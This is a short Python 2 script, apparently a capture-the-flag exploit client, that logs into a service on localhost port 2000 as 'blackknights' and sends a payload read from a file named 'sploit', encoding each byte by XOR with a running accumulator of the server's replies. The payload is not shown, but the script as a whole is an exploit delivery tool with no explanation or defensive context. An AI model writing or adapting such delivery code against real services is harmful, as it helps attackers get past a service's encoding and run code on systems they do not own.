#!/usr/bin/python2

import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect(('localhost', 2000))
sock.sendall('name\nblackknights\nquit\n')

for i in range(75) :
	blah= hex(ord(sock.recv(1)))


fh = open('sploit', 'rb')
raw = fh.read()
fh.close()

raw += chr(0x99)

accumulator = 0

for r in raw :
	inbyte = sock.recv(1)
	accumulator = accumulator ^ ord(inbyte[0])
	outbyte = chr(accumulator ^ ord(r))
	sock.send(outbyte)

print sock.recv(1024)